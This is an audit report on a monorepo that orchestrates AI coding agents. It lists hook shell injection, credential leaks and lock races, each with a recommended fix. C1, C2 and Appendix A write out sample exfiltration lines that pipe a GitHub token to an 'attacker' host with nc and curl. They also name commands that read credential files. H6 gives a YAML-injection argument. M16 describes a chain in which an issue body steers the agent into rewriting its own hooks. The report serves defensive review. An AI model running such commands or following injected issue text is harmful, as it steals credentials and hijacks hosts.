# GitHub Symphony Risk Audit Report

- **Date**: 2026-07-06
- **Scope**: All 14 packages in the monorepo (~40k LOC, non-test)
- **Method**: Multi-agent audit — 6 subsystem + 3 cross-cutting detection agents run in parallel → merge/dedup → adversarial (refute-first) validation per item → severity recalibration
- **Tally**: **153** raw findings → **37** after dedup → **31** passed validation
- **Classification**: ① Design/structure ② Security ③ Usability ④ Other improvements
- **Status**: Awaiting review (no issues filed)

> The top items (C1·C2·H3·H4·H7) were re-verified directly in code by the reviewer. Validation yielded 24 `confirmed` and 7 `plausible` (with supporting evidence).

---

## Summary

| Severity    | Count  | Dimension breakdown                   |
| ----------- | ------ | ------------------------------------- |
| 🔴 Critical | 2      | Security 2                            |
| 🟠 High     | 13     | Security 6 · Design 6 · Usability 1   |
| 🟡 Medium   | 10     | Design 6 · Security 2 · Usability 2   |
| ⚪ Low      | 6      | Design 5 · Usability 1                |
| **Total**   | **31** | Security 12 · Design 15 · Usability 4 |

Key themes:

1. **Missing multi-tenant trust boundary and credential scoping** — untrusted repo configuration (WORKFLOW.md) is executed in a shell, and the orchestrator's full credentials are inherited unfiltered (C1, C2, H1, H2, H5, M25).
2. **State consistency / lock correctness in the Coordination layer** — PID-only locks, non-atomic state writes, crash-recovery deadlock, silent stalls (H7–H11, M18–M20, M24, M25).
3. **Unauthenticated HTTP state-server exposure** — `0.0.0.0` binding + unauthenticated state reads/forced execution (H3, H14, M21).
4. **Text gaps in observability redaction** — only key-name matching by default; tokens embedded in text leak through (H4, M17, M23).

---

## 🔴 Critical

### C1. WORKFLOW.md hook commands executed via `bash -lc` without validation or escaping — Security · confirmed

- **File**: `packages/core/src/workspace/hooks.ts:48`
- **Evidence**: `spawn("bash", ["-lc", normalizedCommand], { env: { ...process.env, ...env } })`. Hook strings are loaded from each repo's WORKFLOW.md (`after_create`/`before_run`/`after_run`/`before_remove`), and `normalizeHookCommand` (210–222) merely prefixes relative paths with `bash ./` — no metacharacter validation or escaping at all. The orchestrator's entire `process.env` (credentials included) is inherited.
- **Impact**: A malicious WORKFLOW.md with `after_create: "echo $GITHUB_GRAPHQL_TOKEN | nc attacker 1"` can exfiltrate tokens, destroy repos, and enable **lateral movement into other tenants sharing the same orchestrator** (RCE-grade).
- **Recommendation**: See **Appendix A (C1 detailed remediation)** below. Summary — ① trust gate (only run hooks from trusted WORKFLOW.md) ② execution isolation (sandbox) ③ strip secrets from the hook env. C2 is fixed as argv-no-shell.

### C2. WORKFLOW.md `agentCommand` re-wrapped in `bash -lc` — shell injection — Security · confirmed

- **Files**: `packages/runtime-codex/src/runtime.ts:445-448`, `:475-478`
- **Evidence**: Only the `bash -lc ` prefix is stripped from `config.agentCommand` (sourced from WORKFLOW.md), and it is re-spawned as `args: ["-lc", shellCmd]` with a `...process.env` spread. No allowlist or escaping.
- **Impact**: `agentCommand: "codex; curl attacker/$(whoami)"` executes an arbitrary shell in the worker environment → RCE, secret exfiltration.
- **Recommendation**: Parse agentCommand into an argv array and spawn without a shell (no composition needed — `codex app-server`). Allowlist approved executables. Avoid spreading the entire process.env.

> **Caution (also applies to single-user deployments)**: [start.ts:96-97](../packages/cli/src/commands/start.ts) also plants the token obtained via `gh auth` into `process.env.GITHUB_GRAPHQL_TOKEN`, so even with local-keyring-only auth, hooks see the token. Additionally, the M16 chain (issue-body injection → agent modifies WORKFLOW.md → hooks run on the next run) leaves the risk in place even for solo deployments.

---

## 🟠 High

### Security

**H1. Token cache and MCP config files written without `0600` — confirmed**
`packages/tool-github-graphql/src/tool.ts:112`, `packages/runtime-claude/src/mcp-compose.ts:44`. `writeFile(path, data, "utf8")` interprets the third argument as an encoding → default 0o666 (0644 after umask, world-readable). Live GitHub tokens and broker secrets are stored in plaintext files. → Co-tenant processes on a shared/container FS can read credentials. **Recommendation**: `{ mode: 0o600 }`, parent directories 0700, and where possible deliver via env/broker to avoid disk writes.

**H2. Orchestrator's entire `process.env` inherited unfiltered by workers, hooks, and tools — confirmed**
`packages/orchestrator/src/service.ts:2792-2812`. `{ ...readProjectEnv, ...inheritedEnv(entire process.env), ...explicitEnv }` — process.env overrides the project .env. A single `GITHUB_GRAPHQL_TOKEN` is passed unscoped to workers/hooks of every project → tenant isolation destroyed. **Recommendation**: allowlist inherited env keys (PATH/HOME/SHELL/TERM…), short-lived scoped tokens per worker, delivery via credential-helper/broker.

**H3. HTTP state/dashboard/control-plane servers bind to `0.0.0.0` with no auth — confirmed**
`packages/cli/src/commands/start.ts` (HTTP_HOST `0.0.0.0`), `packages/dashboard/src/server.ts`, `packages/control-plane/src/server.ts`. `GET /api/v1/state` exposes active issues, run IDs, token usage, workspace paths, session IDs, and lastError; `POST /api/v1/refresh` allows unauthenticated forced reconciliation (DoS). **Recommendation**: default bind `127.0.0.1`, `--bind-all` opt-in, bearer/shared-secret auth on all `/api/v1/*`, redaction of response fields.

**H4. Observability redaction defaults to key-name matching only — confirmed**
`packages/core/src/observability/redaction.ts:26-38`. `redactObservabilitySecrets` is called with `redactStringValues:false` → key matching only; tokens inside free-form strings (errors/stderr/stack traces) pass through. `appendRunEvent`/`saveRun` in `fs-store.ts` use this default path. The text redactor only covers `ghp_`·`lin_`·`sk-`·`Authorization`·`TOKEN=` patterns → `github_pat_` (fine-grained PATs), `gho_`/`ghs_`, in-URL tokens (`https://tok@host`), and custom key names go undetected. → Secrets in error text are stored in `.runtime` events and exposed via the unauthenticated endpoint. **Recommendation**: apply text redaction (`redactStringValues:true`) to free-form fields (error/reason/message/stderr) before persistence, extend detection to URL-embedded/high-entropy/custom keys, sanitize broker/API errors into generic messages.

**H5. No SSRF or scheme validation on broker/GraphQL URLs — confirmed**
`packages/runtime-codex/src/git-credential-helper.ts`, `packages/tool-github-graphql/src/tool.ts:91`, `packages/tool-linear-graphql/src/tool.ts:24`, `packages/runtime-codex/src/runtime.ts:716`. `tokenBrokerUrl`, `linearGraphqlUrl`, and `githubGraphqlApiUrl` are taken from WORKFLOW.md/env and `fetch`ed with a Bearer token, with no https/host validation. → Broker secrets sent in plaintext over `http://` (MITM), SSRF to internal IPs/metadata endpoints. **Recommendation**: enforce https, DNS allowlist (`api.github.com`, `*.linear.app`), reject localhost/private IPs, verify certificates.

**H6. YAML front matter generated via string concatenation when creating WORKFLOW.md/skills — confirmed**
`packages/cli/src/workflow/generate-workflow-md.ts:56-69`. User-provided tracker endpoint/projectSlug interpolated into YAML without escaping. `--linear-project-slug "valid\nruntime:\n  command: malicious"` redefines the runtime section → the worker uses unauthorized configuration. **Recommendation**: use a YAML serializer or YAML-safe escaping/quoting.

### Design

**H7. Project lock only checks PID existence (no TTL) — confirmed**
`packages/orchestrator/src/lock.ts:74`. `startedAt` is stored but unused for staleness determination. `isProcessRunning` is only `process.kill(pid,0)` — no identity check. On PID reuse, a legitimate restart is blocked as "already running," requiring manual intervention. The git lock (`git.ts` `LOCK_STALE_MS=30 min`) is mtime-based → vulnerable to clock skew; recovery from a hung clone is delayed by up to 30 minutes. Thanks to `mkdir wx` atomicity, concurrent execution itself is prevented. **Recommendation**: lease TTL based on `startedAt`, process-identity (cmdline) verification or OS flock/fcntl, heartbeat renewal, reduce/parameterize `LOCK_STALE_MS`.

**H8. `run-once`/`dispatch` load-modify-save issues.json without a file lock — confirmed**
`packages/orchestrator/src/service.ts` (reconcile), `index.ts:167-184` (run-once/dispatch acquire no lock), `fs-store.ts:202` (append without fsync), `:385` (rename without fsync). Two processes load the same snapshot → modify independently → overwrite → state loss/duplicate dispatch. NDJSON append is non-atomic → the last line is truncated on crash. `saveRun` failure unhandled. **Recommendation**: hold the lock across the entire load-modify-save, or optimistic version checking on issues.json; `run-once`/`dispatch` should also acquire the lock; fsync after rename; atomic event writes/checksums; explicit `saveRun` failure handling.

**H9. Incomplete-turn dirty-workspace recovery depends on session metadata — confirmed**
`packages/orchestrator/src/service.ts:2579` (`classifyIncompleteTurnDirtyWorkspace`). Recoverability determination depends on `runtimeSession.status==='active'` and `exitClassification===null`. If a worker crashes after modifying files but before persisting the session exit, the recovery path is skipped → the next run rejects the dirty workspace with `allowDirtyExistingWorkspace=false` → the issue is permanently stuck in 'running' (cycle crash via unhandled exception). **Recommendation**: inspect actual git status at run start instead of session metadata; decouple workspace-state inspection from session classification.

**H10. File tracker silently returns `[]` for corrupted JSON — confirmed**
`packages/tracker-file/src/file-tracker-adapter.ts:72-74`. A `JSON.parse` SyntaxError is caught and `[]` returned — conflating "file corrupted" with "no issues." On corruption, the orchestrator misreads it as "0 active issues" and **silently stops dispatching**. **Recommendation**: distinguish ENOENT (→ `[]`) from parse errors (→ error/log event); prevent partial reads on the write side via tmp+rename.

**H11. Multi-turn refresh vs. turn-execution race + unreachability treated as 'keep running' — confirmed**
`packages/worker/src/index.ts:1625-1640`, `:1981-2005`. `refreshTrackerState` returns `'unknown'` on fetch failure, and the loop treats `'active'|'unknown'` as continue. When the orchestrator is unreachable, the worker burns tokens indefinitely up to maxTurns (default 20), concealing the outage. No per-worker lease/claim → on orchestrator HA failover, two workers apply duplicate side effects (PRs/comments) to the same issue. There is also a state-transition gap between turns. **Recommendation**: acquire a short-lived lease immediately before each turn and abort on failure; fail closed after a consecutive-error threshold on refresh (`orchestrator_unavailable` event + abnormal exit).

**H14. Unbounded/unshaped inputs: POST bodies, Linear pagination, poll interval — confirmed**
`packages/control-plane/src/server.ts:201` (POST `/refresh` `request.resume()` with unlimited size), `packages/tracker-linear/src/orchestrator-adapter.ts:295-340` (do-while pagination with no max-page/timeout), `service.ts:2915-2928` (`polling.intervalMs` with no min/max clamp). → Heap exhaustion via large POSTs (DoS), indefinite waits on large Linear result sets, CPU spin at `intervalMs≈0` or polling effectively disabled at huge values. **Recommendation**: small cap on POST bodies, Linear maxPages + per-page timeout, clamp intervalMs.

### Usability

**H15. Confusing credential-source resolution + auth errors classified by string matching — confirmed**
`packages/cli/src/github/gh-auth.ts:419-452` (env-token failure swallowed with only the gh error surfaced; when both fail, the gh error is discarded), `:206-215`/`:298-313` (env precedence inconsistency), `start.ts:179-208` (auth errors classified via string matching such as `includes("status 401")`). → A user with an expired env token sees "gh auth failed" and re-authenticates the wrong thing; transient network errors get misclassified as auth and cause unnecessary exits. **Recommendation**: report the auth source used per operation + warn when both are set; include all attempted-source failures in the error; typed error classes (`GitHubAuthError`/`GitHubScopeError`) instead of string matching.

---

## 🟡 Medium

| #   | Title                                                                                                                                                                                                                   | Dimension | Validation | Files                                                                     |
| --- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------- | ---------- | ------------------------------------------------------------------------- |
| M16 | Issue bodies/WORKFLOW.md flow unprocessed into agent prompts — **semantic prompt injection + DoS via missing Liquid render timeout**. (The "template injection" claim was refuted: values are substituted as data only) | Security  | plausible  | `service.ts`, `packages/core/src/workflow/render.ts:223`                  |
| M17 | `doctor --json`/`--bundle` captures env secrets and error text without full redaction. (The bundle path is redacted → limited to `--json` + cases where the API embeds tokens in errors)                                | Security  | plausible  | `packages/cli/src/commands/doctor.ts:2677`                                |
| M18 | `stop` PID-file TOCTOU → kills an unrelated process on PID reuse. PID file not cleaned up on spawn failure                                                                                                              | Design    | confirmed  | `packages/cli/src/commands/stop.ts:79`, `start.ts:1103`                   |
| M19 | GraphQL metadata unvalidated + all issues fall back to 'Unknown' when `stateFieldName` is unset → silent stall                                                                                                          | Design    | confirmed  | `packages/tracker-github/src/adapter.ts:345`                              |
| M20 | GitHub GraphQL rate-limit guard check-then-sleep race → API bursts under concurrency trigger real 429s                                                                                                                  | Design    | confirmed  | `packages/tracker-github/src/adapter.ts:1495-1520`                        |
| M21 | HTTP servers lack security headers (X-Frame-Options/nosniff/CSP), log full error objects (path leakage), charset mismatch                                                                                               | Security  | confirmed  | `packages/control-plane/src/server.ts:309`, `dashboard/src/server.ts:117` |
| M22 | Errors swallowed in cleanup/hook/event handlers → stale locks remain, marked 'removed' even when deletion fails (disk leak), observability events lost                                                                  | Usability | confirmed  | `packages/orchestrator/src/service.ts:3268`, `index.ts:117`               |
| M23 | Invalid WORKFLOW.md silently falls back to last-known-good (one stderr message, then hidden by dedup)                                                                                                                   | Usability | confirmed  | `packages/orchestrator/src/service.ts:3012-3067`                          |
| M24 | Exit classification has no `canceled_by_reconciliation` branch → intentional cancellations misclassified as 'error' (metric pollution)                                                                                  | Design    | confirmed  | `packages/core/src/workflow/exit-classification.ts:31`                    |
| M25 | `.runtime` stores all projects' state in one directory with no permission enforcement (`projectDir()` ignores projectId) → cross-project reads/corruption in shared deployments                                         | Design    | confirmed  | `packages/orchestrator/src/fs-store.ts`                                   |

---

## ⚪ Low

| #   | Title                                                                                                                                 | Dimension | Validation | Files                                                        |
| --- | ------------------------------------------------------------------------------------------------------------------------------------- | --------- | ---------- | ------------------------------------------------------------ |
| L26 | Workspace path-escape check hardcodes `/` and misses symlinks (no realpath) → Windows workspace-creation DoS + symlink scenarios      | Security  | confirmed  | `packages/core/src/workspace/safety.ts:10`, `identity.ts:75` |
| L27 | Claude session resume relies on a stderr 4xx regex + no ownership verification. (previousRunId unused in prod → limited risk)         | Design    | plausible  | `packages/runtime-claude/src/adapter.ts:219-283`, `:633-645` |
| L28 | Convergence detection samples git HEAD racily + convergence lock has no max lifetime. (Limited to timestamp-parse-failure edge cases) | Design    | plausible  | `packages/worker/src/convergence-detection.ts:67-149`        |
| L29 | approval/sandbox defaults (`never`/`danger-full-access`) accepted without enum validation → typos silently yield permissive behavior  | Usability | plausible  | `packages/worker/src/codex-policy.ts:11-25`                  |
| L30 | No cross-process lock on config/token-usage/status writes → concurrent `config set` loss, silent loss of token artifacts              | Design    | plausible  | `packages/cli/src/config.ts:171-180`                         |
| L31 | No transition validation for `IssueOrchestrationState` (current call sites are fine, but a refactoring risk)                          | Design    | plausible  | `packages/core/src/contracts/issue-orchestration.ts`         |

---

## Theme Clusters for Triage (Epic candidates)

1. **Multi-tenant credential scoping** — C1, C2, H1, H2, H5, M25 (+ M17)
2. **HTTP server exposure** — H3, H14, M21
3. **Coordination-layer state consistency** — H7, H8, H9, H10, H11, M18, M20, M24, L30, L31
4. **Observability/redaction** — H4, M23 (+ M17)
5. **Input validation/DoS** — H6, H14, M16, L26, L29
6. **Usability/error surfacing** — H15, M19, M22, M23

---

## Appendix A. C1 Detailed Remediation (premised on preserving convenience)

The essence of the vulnerability is not "using local auth" but the combination of **"an untrusted WORKFLOW.md executes an arbitrary shell, and that shell has access to the entire local credential store."** Local auth can be kept.

**Key implication**: stripping just the token from the env is insufficient — if the hook is an arbitrary shell, it can bypass via `gh auth token`, `cat ~/.config/gh/hosts.yml`, or `cat ~/.codex/auth.json`. Hence both axes are mandatory.

**Axis A — Trust gate (top priority, least convenience impact)**: run hooks only from WORKFLOW.md on trusted sources (default branch, trusted committers). Skip hooks from external fork/PR branches, or require explicit approval (pwn-request defense). One-time per-repo trust approval (`--allow-hooks`).

**Axis B — Execution isolation**: run hooks/agents in a container/sandbox to block access to the host credential store. Tighten the existing codex `threadSandbox` (default `danger-full-access`, L29) and inject only scoped/broker tokens into the container.

**Auxiliary — Credential scoping**: strip hook env secrets via a key allowlist. Git is already supplied via credential-helper (`runtime.ts:624`), so hooks need no raw token.

**M16 chain caution**: issue-body injection → agent modifies WORKFLOW.md/hooks → executes on next run. Requires blocking the agent's self-modification of WORKFLOW.md/hooks, or re-approval on change.

### Impact on "running other local CLIs" per defense approach

| Defense approach           | Other CLIs run                            | What breaks                                                                  |
| -------------------------- | ----------------------------------------- | ---------------------------------------------------------------------------- |
| Env secret stripping       | ✅ All work                               | Only hooks relying on `$GITHUB_GRAPHQL_TOKEN`                                |
| Trust gate                 | ✅ All work                               | Only hooks from untrusted repos are blocked                                  |
| Committed-script allowlist | ✅ All work                               | Inline strings banned, script internals free (best balance)                  |
| Sandbox (container)        | ⚠️ Only what's installed in the container | Host `gh auth` keyring invisible → broker/scoped tokens needed               |
| argv-no-shell              | ⚠️ Single CLI only                        | Loses pipes, `&&`, `$VAR`, globs, redirects. Good for C2, overkill for hooks |
| Metacharacter blocklist    | ⚠️ Partial                                | Blocks legitimate compositions too + bypassable → not recommended            |

**Conclusion**: only argv-no-shell fundamentally blocks "running other CLIs," and even it still runs a single CLI (only composition is lost). The rest do not affect CLI execution → **fixable while preserving convenience**. Recommended combination: **C1 = trust gate + hook env stripping + blocking agent self-modification**, **C2 = fixed argv-no-shell**.

---

## Appendix B. Methodology Notes

- 12 detection agents (9 subsystem + 3 cross-cutting), each evaluating all 4 dimensions.
- Each candidate had to pass refute-first adversarial validation (re-checking cited code, default stance = skepticism). `rejected` or `isRealRisk=false` items excluded.
- Severities were recalibrated during validation (e.g., M16's template-injection claim refuted and redefined as semantic injection/DoS; L26 downgraded to a Windows DoS).
- 50 subagents in total, ~3.8M tokens consumed.
